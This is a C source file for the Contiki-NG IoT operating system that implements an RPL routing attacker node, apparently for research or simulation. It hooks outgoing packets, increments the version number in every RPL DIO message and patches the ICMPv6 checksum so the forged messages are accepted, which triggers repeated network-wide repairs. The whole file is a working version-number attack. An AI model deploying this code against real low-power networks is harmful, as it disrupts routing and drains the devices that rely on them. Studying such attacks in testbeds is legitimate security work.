#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include <stdint.h>
#include <inttypes.h>
#include "rpl.h"
#include "net/packetbuf.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-icmp6.h"
#include "net/ipv6/uip.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1

/*---------------------------------------------------------------------------*/
PROCESS(decr_rank_attacker, "RPL DIO version modifier");
AUTOSTART_PROCESSES(&decr_rank_attacker);

uint8_t dodag_version = 0;
bool dodag_version_received = false;

/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_input(void)
{
  uint8_t proto;
  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if (proto == UIP_PROTO_ICMP6 && uip_buf[UIP_IPH_LEN] == ICMP6_RPL 
      && uip_buf[UIP_IPH_LEN + 1] == RPL_CODE_DIO) {
    if (!dodag_version_received) {
      dodag_version = uip_buf[UIP_IPH_LEN + 5];
      dodag_version_received = true;
      LOG_INFO("Received DIO with version number: %d from ", dodag_version);
      LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
      LOG_INFO_("\n");
    }
  }
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_output(const linkaddr_t *localdest)
{
  uint8_t proto;
  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if (proto == UIP_PROTO_ICMP6 && uip_buf[UIP_IPH_LEN] == ICMP6_RPL
        && uip_buf[UIP_IPH_LEN + 1] == RPL_CODE_DIO) {
    // dodag_version ++;
    // uip_buf[UIP_IPH_LEN + 5] = dodag_version; // Increment DIO version number to create a new DIO version
    uip_buf[UIP_IPH_LEN + 5] ++ ;
    LOG_INFO("Checksum before recalculation: %x\n", UIP_ICMP_BUF->icmpchksum);
    UIP_ICMP_BUF->icmpchksum -= uip_htons(0x1); // Adjust checksum for the change in version number
    LOG_INFO("Checksum after recalculation: %x\n", UIP_ICMP_BUF->icmpchksum);
    LOG_INFO("Outgoing DIO message to ");
    LOG_INFO_6ADDR(&UIP_IP_BUF->destipaddr);
    LOG_INFO_("\n");
  }
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
struct netstack_ip_packet_processor packet_processor = {
  .process_input = ip_input,
  .process_output = ip_output
};
/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(decr_rank_attacker, ev, data)
{
  static struct etimer periodic_timer;
  // uip_ipaddr_t root_ipaddr;
  // uip_ipaddr_t multicast_ipaddr;

  // uip_ip6addr(&multicast_ipaddr, 0xff02, 0, 0, 0, 0, 0, 0, 0x1a);

  PROCESS_BEGIN();

  netstack_ip_packet_processor_add(&packet_processor);
  while (1) {
    etimer_set(&periodic_timer, 1 * CLOCK_SECOND);

    // if(NETSTACK_ROUTING.node_is_reachable()
    //    && NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr))
    // {
    //   rpl_icmp6_dio_output(&multicast_ipaddr);
    // }

    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    etimer_reset(&periodic_timer);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
